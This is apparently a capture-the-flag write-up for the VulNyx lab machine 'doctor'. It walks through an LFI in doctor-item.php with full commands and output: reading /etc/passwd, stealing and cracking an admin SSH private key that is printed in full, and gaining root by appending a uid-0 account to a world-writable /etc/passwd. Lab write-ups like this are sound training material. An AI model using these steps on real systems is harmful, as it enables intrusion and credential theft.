# doctor

## Executive Summary

| Machine | Author | Category | Platform |
| :--- | :--- | :--- | :--- |
| doctor | m0w | Low | VulNyx |

**Summary:** The doctor machine hosted an Apache web server running a "Docmed" medical template. Navigation between doctor profile pages was handled by `doctor-item.php`, whose `include` parameter concatenated a filename directly into a file read without any sanitization, an obvious local file inclusion. A parameter fuzz with ffuf confirmed the `include` parameter, and requesting `include=/etc/passwd` dumped the account database, revealing the `admin` user. The inclusion primitive was then aimed at the ssh private key at `/home/admin/.ssh/id_rsa`, which was exfiltrated over HTTP as an encrypted, DES protected RSA key. Converted with `ssh2john` and cracked against the rockyou wordlist, the key passphrase turned out to be the single word `unicorn`. That unlocked a direct SSH login as `admin`, where the user flag was available in the home directory. Privilege escalation reduced to a classic misconfigured file permission: `/etc/passwd` was world writable with mode `-rw----rw-`. The attacker generated an MD5 crypt hash for a brand new account using `openssl passwd`, appended a `r00t` entry carrying uid and gid 0 directly into the password database, and then `su - r00t` with the chosen password produced an operating system root shell, from which both flags were recovered.

---

## Reconnaissance

The engagement opened with host discovery on the lab network.

1. The target was located at `192.168.56.108`:

```bash
┌──(kali㉿kali)-[~/nyx]
└─$ nmap -sn 192.168.56.0/24    
Starting Nmap 7.99 ( https://nmap.org ) at 2026-08-12 06:01 -0400
Nmap scan report for 192.168.56.1 (192.168.56.1)
Host is up (0.00064s latency).
MAC Address: 0A:00:27:00:00:00 (Unknown)
Nmap scan report for 192.168.56.100 (192.168.56.100)
Host is up (0.0045s latency).
MAC Address: 08:00:27:C7:A7:73 (Oracle VirtualBox virtual NIC)
Nmap scan report for 192.168.56.108 (192.168.56.108)
Host is up (0.0019s latency).
MAC Address: 08:00:27:59:4A:A1 (Oracle VirtualBox virtual NIC)
Nmap scan report for 192.168.56.104 (192.168.56.104)
Host is up.
Nmap done: 256 IP addresses (4 hosts up) scanned in 2.05 seconds

┌──(kali㉿kali)-[~/nyx]
└─$ ip=192.168.56.108
```

2. A full port scan with service and script detection followed:

```bash
┌──(kali㉿kali)-[~/nyx]
└─$ nmap -sC -sV -p- -T4 $ip    
Starting Nmap 7.99 ( https://nmap.org ) at 2026-08-12 06:01 -0400
Nmap scan report for 192.168.56.108 (192.168.56.108)
Host is up (0.00028s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 44:95:50:0b:e4:73:a1:85:11:ca:10:ec:1c:cb:d4:26 (RSA)
|   256 27:db:6a:c7:3a:9c:5a:0e:47:ba:8d:81:eb:d6:d6:3c (ECDSA)
|_  256 e3:07:56:a9:25:63:d4:ce:39:01:c1:9a:d9:fe:de:64 (ED25519)
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
|_http-title: Docmed
|_http-server-header: Apache/2.4.38 (Debian)
MAC Address: 08:00:27:59:4A:A1 (Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.66 seconds
```

The box exposed SSH on port 22 and a Docmed themed Apache site on port 80. While poking at the page behavior, a suspicious parameter surfaced in `doctor-item.php`: feeding it the value `Doctors.html` pulled the expected page content, which hinted at an unvalidated file read.

![Local file inclusion vector on doctor-item.php](images/2026-08-12-17-11-16.png)

---

## Initial Access

### Confirming the Local File Inclusion

3. The `doctor-item.php` endpoint appeared to build its response from a file named through a parameter. To find the exact parameter name, ffuf was used to brute force the parameter while setting its value to `/etc/passwd`:

```bash
┌──(kali㉿kali)-[~/nyx]
└─$ ffuf -u "http://$ip/doctor-item.php?FUZZ=/etc/passwd" -w /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -ic -fs 0

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://192.168.56.108/doctor-item.php?FUZZ=/etc/passwd
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 0
________________________________________________

include                 [Status: 200, Size: 1392, Words: 13, Lines: 27, Duration: 3ms]
```

The `include` parameter returned a non-empty response for `/etc/passwd`, confirming the local file inclusion.

4. The parameter was exercised against the system account database:

```bash
┌──(kali㉿kali)-[~/nyx]
└─$ curl -s http://$ip/doctor-item.php?include=/etc/passwd                                                   
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:101:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:104:110::/nonexistent:/usr/sbin/nologin
sshd:x:105:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
admin:x:1000:1000:admin:/home/admin:/bin/bash
```

Arbitrary file read was proven, and the account list showcased a single interactive user with a real shell: `admin`, whose credentials could exist in the `.ssh` directory.

### SSH Private Key Exfiltration and Cracking

5. The LFI was aimed directly at `admin`'s SSH private key:

```bash
┌──(kali㉿kali)-[~/nyx]
└─$ curl -s http://$ip/doctor-item.php?include=/home/admin/.ssh/id_rsa
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: DES-EDE3-CBC,9FB14B3F3D04E90E

uuQm2CFIe/eZT5pNyQ6+K1Uap/FYWcsEklzONt+x4AO6FmjFmR8RUpwMHurmbRC6
hqyoiv8vgpQgQRPYMzJ3QgS9kUCGdgC5+cXlNCST/GKQOS4QMQMUTacjZZ8EJzoe
o7+7tCB8Zk/sW7b8c3m4Cz0CmE5mut8ZyuTnB0SAlGAQfZjqsldugHjZ1t17mldb
+gzWGBUmKTOLO/gcuAZC+Tj+BoGkb2gneiMA85oJX6y/dqq4Ir10Qom+0tOFsuot
b7A9XTubgElslUEm8fGW64kX3x3LtXRsoR12n+krZ6T+IOTzThMWExR1Wxp4Ub/k
HtXTzdvDQBbgBf4h08qyCOxGEaVZHKaV/ynGnOv0zhlZ+z163SjppVPK07H4bdLg
9SC1omYunvJgunMS0ATC8uAWzoQ5Iz5ka0h+NOofUrVtfJZ/OnhtMKW+M948EgnY
zh7Ffq1KlMjZHxnIS3bdcl4MFV0F3Hpx+iDukvyfeeWKuoeUuvzNfVKVPZKqyaJu
rRqnxYW/fzdJm+8XViMQccgQAaZ+Zb2rVW0gyifsEigxShdaT5PGdJFKKVLS+bD1
tHBy6UOhKCn3H8edtXwvZN+9PDGDzUcEpr9xYCLkmH+hcr06ypUtlu9UrePLh/Xs
94KATK4joOIW7O8GnPdKBiI+3Hk0qakL1kyYQVBtMjKTyEM8yRcssGZr/MdVnYWm
VD5pEdAybKBfBG/xVu2CR378BRKzlJkiyqRjXQLoFMVDz3I30RpjbpfYQs2Dm2M7
Mb26wNQW4ff7qe30K/Ixrm7MfkJPzueQlSi94IHXaPvl4vyCoPLW89JzsNDsvG8P
hrkWRpPIwpzKdtMPwQbkPu4ykqgKkYYRmVlfX8oeis3C1hCjqvp3Lth0QDI+7Shr
Fb5w0n0qfDT4o03U1Pun2iqdI4M+iDZUF4S0BD3xA/zp+d98NnGlRqMmJK+StmqR
IIk3DRRkvMxxCm12g2DotRUgT2+mgaZ3nq55eqzXRh0U1P5QfhO+V8WzbVzhP6+R
MtqgW1L0iAgB4CnTIud6DpXQtR9l//9alrXa+4nWcDW2GoKjljxOKNK8jXs58SnS
62LrvcNZVokZjql8Xi7xL0XbEk0gtpItLtX7xAHLFTVZt4UH6csOcwq5vvJAGh69
Q/ikz5XmyQ+wDwQEQDzNeOj9zBh1+1zrdmt0m7hI5WnIJakEM2vqCqluN5CEs4u8
p1ia+meL0JVlLobfnUgxi3Qzm9SF2pifQdePVU4GXGhIOBUf34bts0iEIDf+qx2C
pwxoAe1tMmInlZfR2sKVlIeHIBfHq/hPf2PHvU0cpz7MzfY36x9ufZc5MH2JDT8X
KREAJ3S0pMplP/ZcXjRLOlESQXeUQ2yvb61m+zphg0QjWH131gnaBIhVIj1nLnTa
i99+vYdwe8+8nJq4/WXhkN+VTYXndET2H0fFNTFAqbk2HGy6+6qS/4Q6DVVxTHdp
4Dg2QRnRTjp74dQ1NZ7juucvW7DBFE+CK80dkrr9yFyybVUqBwHrmmQVFGLkS2I/
8kOVjIjFKkGQ4rNRWKVoo/HaRoI/f2G6tbEiOVclUMT8iutAg8S4VA==
-----END RSA PRIVATE KEY-----
```

The header `Proc-Type: 4, ENCRYPTED` revealed a passphrase protected RSA key protected with the DES-EDE3-CBC cipher. The key was saved to disk and converted into a crackable format.

6. The key was saved, its permissions tightened, and a hash extracted with `ssh2john`:

```bash
┌──(kali㉿kali)-[~/nyx]
└─$ curl -s "http://$ip/doctor-item.php?include=/home/admin/.ssh/id_rsa" -o id_rsa

┌──(kali㉿kali)-[~/nyx]
└─$ chmod 600 id_rsa

┌──(kali㉿kali)-[~/nyx]
└─$ ssh2john id_rsa > id_rsa.hash
```

7. John the Ripper was aimed at the key with the rockyou wordlist:

```bash
┌──(kali㉿kali)-[~/nyx]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa.hash
Created directory: /home/kali/.john
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 1 for all loaded hashes
Cost 2 (iteration count) is 2 for all loaded hashes
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
unicorn          (id_rsa)     
1g 0:00:00:00 DONE (2026-08-12 06:15) 25.00g/s 31200p/s 31200c/s 31200C/s pedro..shirley
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

The passphrase `unicorn` was recovered within a second.

8. The key was used to log into the server as `admin`:

```bash
┌──(kali㉿kali)-[~/nyx]
└─$ ssh -i id_rsa admin@$ip      
The authenticity of host '192.168.56.108 (192.168.56.108)' can't be established.
ED25519 key fingerprint is: SHA256:0x3tf1iiGyqlMEM47ZSWSJ4hLBu7FeVaeaT2FxM7iq8
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.56.108' (ED25519) to the list of known hosts.
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
Enter passphrase for key 'id_rsa': 
admin@doctor:~$ id;whoami
uid=1000(admin) gid=1000(admin) grupos=1000(admin)
admin
admin@doctor:~$ ls -la
total 28
drwx------ 3 admin admin 4096 dic 30  2024 .
drwxr-xr-x 3 root  root  4096 abr 21  2023 ..
lrwxrwxrwx 1 root  root     9 ago 16  2021 .bash_history -> /dev/null
-rwx------ 1 admin admin  220 ago 16  2021 .bash_logout
-rwx------ 1 admin admin 3526 ago 16  2021 .bashrc
-rwx------ 1 admin admin  807 ago 16  2021 .profile
drwx------ 2 admin admin 4096 ago 16  2021 .ssh
-r-------- 1 admin admin   33 abr 21  2023 user.txt
```

A stable shell existed as `admin`, a real system user, with the user flag already sitting in the home directory.

---

## Privilege Escalation

### World-Writable /etc/passwd

9. The permissions of the password database were checked early, and they were catastrophic:

```bash
admin@doctor:~$ ls -la /etc/passwd
-rw----rw- 1 root root 1392 dic 30  2024 /etc/passwd
```

The mode `-rw----rw-` meant `admin` could read and write the root-owned file. A writable `/etc/passwd` is a trusted and well documented root escalation path, since the file itself authorizes account identity.

10. An MD5 crypt hash was generated for a brand new account with the password `rooted`:

```bash
admin@doctor:~$ openssl passwd -1 -salt xyz rooted
$1$xyz$txYmAcRyLmpCUI5OSYRFi1
```

11. A new entry named `r00t`, carrying uid and gid 0, was appended directly to the password database:

```bash
admin@doctor:~$ echo 'r00t:$1$xyz$txYmAcRyLmpCUI5OSYRFi1:0:0:root:/root:/bin/bash' >> /etc/passwd
```

12. Switching to the fabricated superuser account produced a root shell:

```bash
admin@doctor:~$ su - r00t
Contraseña: 
root@doctor:~# id;whoami;hostname
uid=0(root) gid=0(root) grupos=0(root)
root
doctor
root@doctor:~# cat /home/admin/user.txt /root/root.txt 
```

Because the new account was registered with uid `0`, `su - r00t` authenticated straight into a root shell, and both the user and root flags were collected.

---

## Attack Chain Summary

1. **Reconnaissance**: A ping sweep isolated the target at `192.168.56.108`, and a full Nmap scan exposed SSH on port 22 and the Docmed themed Apache application on port 80.

2. **Vulnerability Discovery**: The `doctor-item.php` script was found to include arbitrary files through the `include` parameter. An ffuf parameter fuzz confirmed the parameter, and requesting `/etc/passwd` demonstrated full arbitrary file read.

3. **Exploitation**: The LFI exfiltrated the passphrase protected SSH key at `/home/admin/.ssh/id_rsa`. Its hash was cracked with John the Ripper against rockyou, recovering the passphrase `unicorn` and permitting an SSH login as `admin`.

4. **Internal Enumeration**: Inside the session, the file mode `-rw----rw-` on `/etc/passwd` exposed a world writable password database, an immediate root escalation primitive.

5. **Privilege Escalation**: An MD5 crypt hash was generated with `openssl passwd`, and a `r00t` account with uid and gid 0 was appended to `/etc/passwd`. Running `su - r00t` produced a root shell and full control of the machine.